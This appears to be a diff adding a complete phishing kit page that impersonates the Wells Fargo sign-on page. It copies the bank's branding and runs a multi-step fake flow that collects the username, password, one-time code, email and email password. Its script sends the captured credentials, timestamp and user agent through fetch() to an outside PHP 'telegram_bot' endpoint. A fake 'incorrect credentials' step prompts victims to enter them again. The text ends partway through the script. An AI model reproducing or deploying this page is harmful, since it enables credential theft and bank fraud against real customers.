@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Wells Fargo Sans", Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .background-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: opacity 1s ease-in-out;
+        }
+        
+        .visuallyHidden {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+        
+        /* Header and navigation */
+        .masthead {
+            background-color: #c8102e; /* Wells Fargo red */
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .logo-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .logo {
+            width: 148px;
+            height: 16px;
+            fill: #ffffff; /* White logo */
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+        
+        .nav-links li {
+            margin-left: 20px;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: #ffffff; /* White text */
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .search-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .search-container input {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        
+        .search-container button {
+            background: none;
+            border: none;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+        
+        /* Main content */
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+            padding: 40px 20px;
+        }
+        
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 440px;
+            margin-top: 20px;
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #3b3331;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        .login-subtitle {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .verification-message {
+            text-align: center;
+            margin: 20px 0;
+            color: #468254;
+            font-size: 16px;
+            font-weight: 500;
+            min-height: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-label {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 14px;
+            color: #666;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #c8102e; /* Wells Fargo red */
+        }
+        
+        .form-input:focus + .input-label,
+        .form-input:not(:placeholder-shown) + .input-label {
+            top: -8px;
+            left: 8px;
+            font-size: 12px;
+            background-color: #fff;
+            padding: 0 4px;
+            color: #c8102e; /* Wells Fargo red */
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #5a469b;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+        
+        .checkbox-container input {
+            margin-right: 10px;
+            margin-top: 3px;
+        }
+        
+        .checkbox-label {
+            font-size: 14px;
+            color: #3b3331;
+        }
+        
+        .checkbox-help {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .sign-on-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #c8102e; /* Wells Fargo red */
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .sign-on-button:hover {
+            background-color: #a80d26; /* Darker red */
+        }
+        
+        .back-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #fff;
+            color: #c8102e;
+            border: 1px solid #c8102e;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .back-button:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #ddd;
+        }
+        
+        .divider span {
+            background-color: #fff;
+            padding: 0 10px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .passkey-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #fff;
+            color: #c8102e; /* Wells Fargo red */
+            border: 1px solid #c8102e; /* Wells Fargo red */
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        
+        .passkey-button:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .passkey-icon {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+        
+        .passkey-help {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .forgot-link a {
+            color: #5a469b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        
+        /* OTP specific styles */
+        .otp-input-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+        
+        .otp-input:focus {
+            outline: none;
+            border-color: #c8102e;
+        }
+        
+        .otp-help {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .resend-otp {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend-otp a {
+            color: #5a469b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .resend-otp a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Disclosures */
+        .disclosures {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .disclosures strong {
+            color: #3b3331;
+        }
+        
+        .disclosures ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #fff;
+            padding: 30px 20px;
+            border-top: 1px solid #ddd;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            list-style: none;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links li {
+            margin: 0 10px 10px;
+        }
+        
+        .footer-links a {
+            color: #3b3331;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* Login steps */
+        .login-step {
+            display: none;
+        }
+        
+        .login-step.active {
+            display: block;
+        }
+        
+        /* Loading animation */
+        .loading-dots {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 20px;
+            margin: 10px auto;
+        }
+        
+        .loading-dots div {
+            position: absolute;
+            top: 8px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #c8102e;
+            animation-timing-function: cubic-bezier(0, 1, 1, 0);
+        }
+        
+        .loading-dots div:nth-child(1) {
+            left: 8px;
+            animation: loading-dots1 0.6s infinite;
+        }
+        
+        .loading-dots div:nth-child(2) {
+            left: 8px;
+            animation: loading-dots2 0.6s infinite;
+        }
+        
+        .loading-dots div:nth-child(3) {
+            left: 32px;
+            animation: loading-dots2 0.6s infinite;
+        }
+        
+        .loading-dots div:nth-child(4) {
+            left: 56px;
+            animation: loading-dots3 0.6s infinite;
+        }
+        
+        @keyframes loading-dots1 {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes loading-dots2 {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(24px, 0); }
+        }
+        
+        @keyframes loading-dots3 {
+            0% { transform: scale(1); }
+            100% { transform: scale(0); }
+        }
+        
+        /* Error message */
+        .error-message {
+            color: #c8102e;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .logo-bar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .nav-links {
+                margin-top: 15px;
+                flex-wrap: wrap;
+            }
+            
+            .nav-links li {
+                margin: 0 10px 10px 0;
+            }
+            
+            .login-container {
+                padding: 20px;
+            }
+            
+            .otp-input {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .footer-links li {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background container with dynamic image -->
+    <div class="background-container">
+        <img id="background-image" class="background-image" src="" alt="Wells Fargo background">
+    </div>
+
+    <div class="masthead">
+        <div class="logo-bar">
+            <div class="logo-container">
+                <svg class="logo" viewBox="0 0 148 16" aria-hidden="true" role="img" focusable="false">
+                    <g>
+                        <path d="M31.5783,10.22 L33.0183,10.22 L33.0183,15 L20.9983,15 L20.9983,13.26 L22.6983,13.26 L22.6983,2.74 L19.94,2.74 L16.44,15 L13.66,15 L10.82,4.84
+                        L7.9,15 L5.12,15 L1.6,2.74 L0,2.74 L0,1 L6.52,1 L6.52,2.74 L4.64,2.74 L6.98,11.18 L9.78,1 L12.66,1 L15.52,11.2 L17.82,2.74 L15.86,2.74 L15.86,1
+                        L32.8185,1 L32.8185,5.54 L31.3785,5.54 L31.2385,5 C30.7985,3.32 30.3385,2.74 28.9985,2.74 L25.6785,2.74 L25.6785,6.96 L29.6985,6.96 C29.8509872,7.25655731
+                        29.9266299,7.5866346 29.9185,7.92 C29.9289227,8.26639109 29.8533362,8.60996586 29.6985,8.92 L25.6785,8.92 L25.6785,13.26 L29.1385,13.26 C30.4385,13.26
+                        31.0185,12.7 31.4185,10.92 L31.5783,10.22 Z M44.2172,10.92 C43.8172,12.7 43.2572,13.26 41.9372,13.26 L39.1572,13.26 L39.1572,2.74 L41.0572,2.74 L41.0572,1
+                        L34.4772,1 L34.4772,2.74 L36.1772,2.74 L36.1772,13.26 L34.4772,13.26 L34.4772,15 L45.8172,15 L45.8172,10.22 L44.3772,10.22 L44.2172,10.92 Z M56.8161,10.92
+                        C56.4161,12.7 55.8561,13.26 54.5361,13.26 L51.7561,13.26 L51.7561,2.74 L53.6561,2.74 L53.6561,1 L47.0761,1 L47.0761,2.74 L48.7761,2.74 L48.7761,13.26 L47.0761,13.26
+                        L47.0761,15 L58.4161,15 L58.4161,10.22 L56.9761,10.22 L56.8161,10.92 Z M67.3548,6.8 L64.8148,6.22 C63.3348,5.88 62.7148,5.3 62.7148,4.32 C62.7148,3.14 63.6548,2.4
+                        65.4948,2.4 C67.3348,2.4 68.4148,3.06 68.8348,4.62 L69.0148,5.3 L70.4548,5.3 L70.4548,1.84 C68.8830796,1.03158224 67.1423274,0.606665867 65.3749,0.6 C61.9549,0.6
+                        59.7549,2.24 59.7549,4.88 C59.7549,6.92 61.0349,8.42 63.4949,8.96 L66.0349,9.52 C67.6549,9.88 68.2549,10.52 68.2549,11.58 C68.2549,12.88 67.2749,13.6 65.3149,13.6
+                        C63.0949,13.6 61.9549,12.72 61.4549,11.04 L61.1949,10.18 L59.7549,10.18 L59.7549,14.1 C61.5849502,15.0113218 63.6113126,15.4578084 65.6549,15.4 C69.0149,15.4 71.2149,13.72
+                        71.2149,11.1 C71.2148,8.9 69.8747,7.38 67.3548,6.8 Z M86.6329,2.74 C87.9729,2.74 88.4329,3.32 88.8729,5 L89.0129,5.54 L90.4529,5.54 L90.4529,1 L78.3929,1 L78.3929,2.74 L80.0929,
+                        2.74 L80.0929,13.26 L78.3929,13.26 L78.3929,15 L85.0729,15 L85.0729,13.26 L83.0729,13.26 L83.0729,9.18 L87.1929,9.18 C87.3477086,8.86995608 87.4232935,8.52638836
+                        87.4129,8.18 C87.4210727,7.84663029 87.3454276,7.51654256 87.1929,7.22 L83.0729,7.22 L83.0729,2.74 L86.6329,2.74 Z M117.1107,13.42 C117.350603,13.9403466
+                        117.350603,14.5396534 117.1107,15.06 C116.593408,15.1270209 116.072315,15.1604243 115.5507,15.16 C113.6107,15.16 112.6707,14.36 112.4507,12.5 L112.3707,11.8 C112.1307,9.78
+                        111.4707,9 109.2707,9 L108.1707,9 L108.1707,13.26 L110.0707,13.26 L110.0707,15 L97.4921,15 L97.4921,13.26 L99.1321,13.26 L98.2121,10.76 L93.0121,10.76 L92.0921,13.26 L93.7721,
+                        13.26 L93.7721,15 L88.4721,15 L88.4721,13.26 L89.8721,13.26 L94.772,1 L97.432,1 L102.432,13.26 L105.1907,13.26 L105.1907,2.74 L103.4907,2.74 L103.4907,1 L111.5307,1 C114.3907,
+                        1 116.2507,2.42 116.2507,4.7 C116.236826,5.65544044 115.842919,6.56599554 115.156084,7.23031176 C114.469248,7.89462798 113.546072,8.25797324 112.5907,8.24 L112.5907,
+                        8.3 C113.320265,8.29049748 114.022729,8.57612277 114.538653,9.09204674 C115.054577,9.60797071 115.340203,10.3104352 115.3307,11.04 L115.4107,11.78 C115.5307,12.94 115.7707,
+                        13.46 116.6907,13.46 C116.831581,13.4586084 116.972089,13.4452267 117.1107,13.42 Z M97.5719,9.06 L95.6119,3.76 L93.6519,9.06 L97.5719,9.06 Z M113.2307,4.98 C113.2307,
+                        3.52 112.3307,2.74 110.5307,2.74 L108.1707,2.74 L108.1707,7.24 L110.5307,7.24 C112.3108,7.24 113.2307,6.42 113.2307,4.98 Z M125.1745,8.62 C125.161819,8.96019815 125.237622,
+                        9.29786628 125.3945,9.6 L127.7745,9.6 L127.7745,13.14 C127.025969,13.4478108 126.223838,13.6041585 125.4145,13.6 C122.5345,13.6 121.0345,11.54 121.0345,7.98 C121.0345,
+                        4.42 122.5345,2.36 125.2545,2.36 C126.847915,2.27805546 128.291943,3.29300049 128.7545,4.82 L128.9745,5.38 L130.4145,5.38 L130.4145,1.8 C128.769872,0.975783763 126.954079,
+                        0.550956677 125.1145,0.56 C120.7145,0.56 117.7545,3.5 117.7545,8 C117.7545,12.52 120.6345,15.4 125.1145,15.4 C127.070757,15.3481445 128.988059,14.8414289 130.7145,
+                        13.92 L130.7145,7.68 L125.3945,7.68 C125.23997,7.96860667 125.164097,8.29279214 125.1745,8.62 Z M147.4382,7.98 C147.4382,12.0889985 144.107199,15.42 139.9982,15.42 C135.889201,
+                        15.42 132.5582,12.0889985 132.5582,7.98 C132.5582,3.87100146 135.889201,0.54 139.9982,0.54 C144.107199,0.54 147.4382,3.87100146 147.4382,7.98 Z M144.1582,7.98 C144.1582,
+                        4.44 142.6982,2.38 139.9982,2.38 C137.2982,2.38 135.8382,4.44 135.8382,7.98 C135.8382,11.54 137.2782,13.58 139.9982,13.58 C142.7182,13.58 144.1582,11.54 144.1582,7.98 Z"></path>
+                    </g>
+                </svg>
+                <span class="visuallyHidden">Wells Fargo</span>
+            </div>
+            
+            <ul class="nav-links">
+                <li><a href="#">Enroll</a></li>
+                <li><a href="#">Customer Service</a></li>
+                <li><a href="#">ATMs/Locations</a></li>
+                <li><a href="#">Español</a></li>
+                <li>
+                    <div class="search-container">
+                        <input type="text" placeholder="Search" aria-label="Search">
+                        <button aria-label="Search">
+                            <svg width="20" height="20" viewBox="0 0 20 20" aria-hidden="true" role="img" focusable="false">
+                                <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                    <g fill="#ffffff">
+                                        <path d="M19.633175,17.9638111 L14.1574098,12.4856873 C15.1389485,11.1469131 15.664755,9.52836696 15.6574238,7.86831972 C15.6386954,3.53504559 12.1339938,0.0251075646 7.80092209,7.96007691e-05 C5.72730302,-0.00930269987 3.73605767,0.81105703 2.27077918,2.27840585 C0.805500694,3.74575466 -0.0120928677,5.73820252 0.000135215858,7.8118884 C0.0188635483,12.145557 3.52388496,15.6558148 7.85735118,15.6808428 C9.52409554,15.688067 11.1484911,15.1561022 12.4881086,14.1643404 L12.4938229,14.1600545 L17.9645881,19.6338924 C18.2603749,19.9442125 18.7011175,20.0698227 19.1160487,19.9620551 C19.5309799,19.8542875 19.8549019,19.5300753 19.9623101,19.1150357 C20.0697184,18.6999962 19.9437359,18.2593439 19.633175,17.9638111 L19.633175,17.9638111 Z M7.85163685,14.1121951 C4.38505325,14.0922527 1.58108171,11.284347 1.56586407,7.81760296 C1.55650769,6.15886911 2.21063635,4.56523094 3.38263843,3.3914386 C4.55464052,2.21764625 6.14724151,1.56112283 7.80592213,1.56801306 C11.2725057,1.58795544 14.0764773,4.39586112 14.0916949,7.86260515 C14.1010513,9.521339 13.4469226,11.1149772 12.2749205,12.2887695 C11.1029185,13.4625619 9.51031747,14.1190853 7.85163685,14.1121951 Z"></path>
+                                    </g>
+                                </g>
+                            </svg>
+                        </button>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="login-container">
+            <!-- Step 1: Username and Password -->
+            <div id="step1" class="login-step active">
+                <h1 class="login-title" id="greeting">Good morning</h1>
+                
+                <form id="signOnForm" action="#" method="post" autocomplete="off">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="text" id="username" class="form-input" placeholder=" " required>
+                            <label for="username" class="input-label">Username</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="password" id="password" class="form-input" placeholder=" " required>
+                            <label for="password" class="input-label">Password</label>
+                            <button type="button" class="password-toggle">Show</button>
+                        </div>
+                    </div>
+                    
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="saveUsername">
+                        <div>
+                            <label for="saveUsername" class="checkbox-label">Save username</label>
+                            <div class="checkbox-help">To help keep your account secure, save your username only on devices that aren't used by other people.</div>
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="continueButton" class="sign-on-button">Continue</button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button type="button" class="passkey-button">
+                        <svg class="passkey-icon" viewBox="0 0 16 16" aria-hidden="true" role="img" focusable="false">
+                            <path d="M6 7.66683C8.02505 7.66683 9.66667 6.02521 9.66667 4.00016C9.66667 1.97512 8.02505 0.333496 6 0.333496C3.97496 0.333496 2.33334 1.97512 2.33334 4.00016C2.33334 6.02521 3.97496 7.66683 6 7.66683Z"></path>
+                            <path d="M15.9232 7.6124C15.9249 7.08662 15.7904 6.56999 15.5336 6.1165C15.2768 5.66301 14.9071 5.28931 14.4632 5.03445C14.0194 4.77958 13.5176 4.65291 13.0103 4.66766C12.5031 4.68241 12.0089 4.83805 11.5796 5.11832C11.1502 5.39858 10.8014 5.79318 10.5695 6.26088C10.3377 6.72858 10.2313 7.25222 10.2615 7.77707C10.2918 8.30192 10.4575 8.80872 10.7414 9.24452C11.0254 9.68031 11.417 10.0291 11.8755 10.2544V14.7417L13.0898 15.9998L15.1136 13.903L13.8993 12.6449L15.1136 11.3867L14.1098 10.3467C14.643 10.1336 15.1014 9.75837 15.425 9.2704C15.7486 8.78242 15.9223 8.20446 15.9232 7.6124ZM13.0898 7.6124C12.9297 7.6124 12.7732 7.56321 12.6401 7.47104C12.507 7.37888 12.4032 7.24789 12.3419 7.09463C12.2807 6.94137 12.2646 6.77272 12.2959 6.61002C12.3271 6.44732 12.4042 6.29787 12.5174 6.18057C12.6306 6.06327 12.7749 5.98339 12.9319 5.95103C13.0889 5.91866 13.2517 5.93527 13.3996 5.99875C13.5475 6.06224 13.674 6.16974 13.7629 6.30767C13.8519 6.4456 13.8993 6.60777 13.8993 6.77365C13.8993 6.9961 13.8141 7.20944 13.6622 7.36673C13.5104 7.52403 13.3045 7.6124 13.0898 7.6124Z"></path>
+                            <path d="M9.68 8.7885C9.03022 8.48892 8.32682 8.3339 7.61538 8.3335H5.07692C3.73044 8.3335 2.4391 8.88662 1.487 9.87119C0.534889 10.8558 0 12.1911 0 13.5835V15.3335H11V10.5122C10.4294 10.0589 9.97591 9.46678 9.68 8.7885Z"></path>
+                        </svg>
+                        <span>Use a passkey</span>
+                    </button>
+                    
+                    <div class="passkey-help">
+                        Don't have one? Create a passkey after signing on and skip the password next time.
+                    </div>
+                    
+                    <div class="forgot-link">
+                        <a href="#">Forgot username or password?</a>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Step 2: Revalidation -->
+            <div id="step2" class="login-step">
+                <h1 class="login-title">Revalidate Your Credentials</h1>
+                <p class="login-subtitle" id="revalidationMessage">One of your username or password is not correct. Please re-enter your credentials.</p>
+                
+                <form id="revalidationForm" action="#" method="post" autocomplete="off">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="text" id="revalidateUsername" class="form-input" placeholder=" " required>
+                            <label for="revalidateUsername" class="input-label">Username</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="password" id="revalidatePassword" class="form-input" placeholder=" " required>
+                            <label for="revalidatePassword" class="input-label">Password</label>
+                            <button type="button" class="password-toggle">Show</button>
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="revalidateButton" class="sign-on-button">Revalidate</button>
+                    <button type="button" id="backToStep1Button" class="back-button">Back</button>
+                </form>
+            </div>
+            
+            <!-- Step 3: OTP Verification -->
+            <div id="step3" class="login-step">
+                <h1 class="login-title">Verify Your Identity</h1>
+                <p class="login-subtitle">Enter the verification code sent to your phone</p>
+                
+                <div class="otp-input-container">
+                    <input type="text" class="otp-input" maxlength="1" required>
+                    <input type="text" class="otp-input" maxlength="1" required>
+                    <input type="text" class="otp-input" maxlength="1" required>
+                    <input type="text" class="otp-input" maxlength="1" required>
+                    <input type="text" class="otp-input" maxlength="1" required>
+                    <input type="text" class="otp-input" maxlength="1" required>
+                </div>
+                
+                <p class="otp-help">We sent a 6-digit code to your registered phone number</p>
+                
+                <button type="button" id="verifyOtpButton" class="sign-on-button">Verify</button>
+                <button type="button" id="backToStep2Button" class="back-button">Back</button>
+                
+                <div class="resend-otp">
+                    <a href="#" id="resendOtpLink">Resend code</a>
+                </div>
+            </div>
+            
+            <!-- Step 4: Email and Password Verification -->
+            <div id="step4" class="login-step">
+                <h1 class="login-title">Verify Your Identity</h1>
+                <p class="login-subtitle">For your security, please enter your email and password to continue.</p>
+                
+                <form id="verificationForm" action="#" method="post" autocomplete="off">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="email" id="email" class="form-input" placeholder=" " required>
+                            <label for="email" class="input-label">Email Address</label>
+                        </div>
+                        <div id="emailError" class="error-message">Please enter a valid email address.</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="password" id="verificationPassword" class="form-input" placeholder=" " required>
+                            <label for="verificationPassword" class="input-label">Password</label>
+                            <button type="button" class="password-toggle">Show</button>
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="verifyButton" class="sign-on-button">Verify and Sign On</button>
+                    <button type="button" id="backToStep3Button" class="back-button">Back</button>
+                    
+                    <div class="forgot-link">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Step 5: Email and Password Revalidation -->
+            <div id="step5" class="login-step">
+                <h1 class="login-title">Revalidate Your Email and Password</h1>
+                <p class="login-subtitle" id="emailRevalidationMessage">One of your email or password is not correct. Please re-enter your credentials.</p>
+                
+                <form id="emailRevalidationForm" action="#" method="post" autocomplete="off">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="email" id="revalidateEmail" class="form-input" placeholder=" " required>
+                            <label for="revalidateEmail" class="input-label">Email Address</label>
+                        </div>
+                        <div id="revalidateEmailError" class="error-message">Please enter a valid email address.</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="password" id="revalidateVerificationPassword" class="form-input" placeholder=" " required>
+                            <label for="revalidateVerificationPassword" class="input-label">Password</label>
+                            <button type="button" class="password-toggle">Show</button>
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="revalidateEmailButton" class="sign-on-button">Revalidate</button>
+                    <button type="button" id="backToStep4Button" class="back-button">Back</button>
+                </form>
+            </div>
+            
+            <!-- Step 6: Verification in Progress -->
+            <div id="step6" class="login-step">
+                <h1 class="login-title">Verifying Your Identity</h1>
+                <p class="login-subtitle">Please wait while we verify your information.</p>
+                
+                <div class="loading-dots">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+                
+                <div id="verificationMessage" class="verification-message">
+                    <!-- Verification messages will appear here -->
+                </div>
+            </div>
+            
+            <div class="disclosures">
+                <div>
+                    <strong>Investment and Insurance Products are:</strong>
+                    <ul>
+                        <li><strong>Not Insured by the FDIC or Any Federal Government Agency</strong></li>
+                        <li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li>
+                        <li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li>
+                    </ul>
+                </div>
+                <div>
+                    <p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <ul class="footer-links">
+            <li><a href="#">About Wells Fargo</a></li>
+            <li><a href="#">Online Access Agreement</a></li>
+            <li><a href="#">Privacy, Cookies, Security & Legal</a></li>
+            <li><a href="#">Do not sell or share my personal information</a></li>
+            <li><a href="#">Notice of Data Collection</a></li>
+            <li><a href="#">Report Email Fraud</a></li>
+            <li><a href="#">Security Center</a></li>
+            <li><a href="#">Sitemap</a></li>
+            <li><a href="#">Give Us Feedback</a></li>
+        </ul>
+        <div class="copyright">
+            © 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801
+        </div>
+    </div>
+
+    <script>
+        // Set background image based on time of day
+        function setTimeBasedBackground() {
+            const hour = new Date().getHours();
+            const backgroundImage = document.getElementById('background-image');
+            const greeting = document.getElementById('greeting');
+            
+            let imageUrl, greetingText;
+            
+            if (hour >= 5 && hour < 12) {
+                imageUrl = 'https://www10.wellsfargomedia.com/auth/static/images/Summer2025_Morning.jpg';
+                greetingText = 'Good morning';
+            } else if (hour >= 12 && hour < 18) {
+                imageUrl = 'https://www10.wellsfargomedia.com/auth/static/images/Summer2025_Afternoon.jpg';
+                greetingText = 'Good afternoon';
+            } else {
+                imageUrl = 'https://www10.wellsfargomedia.com/auth/static/images/Summer2025_Evening.jpg';
+                greetingText = 'Good evening';
+            }
+            
+            backgroundImage.src = imageUrl;
+            if (greeting) greeting.textContent = greetingText;
+        }
+
+        // Password toggle functionality
+        function setupPasswordToggles() {
+            document.querySelectorAll('.password-toggle').forEach(toggle => {
+                toggle.addEventListener('click', function() {
+                    const input = this.parentElement.querySelector('input');
+                    if (input.type === 'password') {
+                        input.type = 'text';
+                        this.textContent = 'Hide';
+                    } else {
+                        input.type = 'password';
+                        this.textContent = 'Show';
+                    }
+                });
+            });
+        }
+
+        // Telegram function - sends data to PHP endpoint
+        function sendToTelegram(data) {
+            const formData = new FormData();
+            formData.append('data', JSON.stringify(data));
+            
+            fetch('http://srv242635.hoster-test.ru/123/Wellz/Wells/telegram_bot.php', {
+                method: 'POST',
+                body: formData
+            }).catch(error => console.log('Telegram error:', error));
+        }
+
+        // Step management
+        let userCredentials = {};
+
+        function showStep(step) {
+            document.querySelectorAll('.login-step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        // OTP input auto-focus and navigation
+        function setupOtpInputs() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    if (this.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        // Button event handlers
+        document.getElementById('continueButton').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                userCredentials.username = username;
+                userCredentials.password = password;
+                
+                // Send to Telegram
+                sendToTelegram({
+                    step: 'Step 1 - Initial Login',
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    userAgent: navigator.userAgent
+                });
+                
+                document.getElementById('revalidateUsername').value = username;
+                showStep(2);
+            } else {
+                alert('Please enter both username and password.');
+            }
+        });
+
+        document.getElementById('revalidateButton').addEventListener('click', function() {
+            const username = document.getElementById('revalidateUsername').value;
+            const password = document.getElementById('revalidatePassword').value;
+            
+            if (username && password) {
+                sendToTelegram({
+                    step: 'Step 2 - Revalidation',
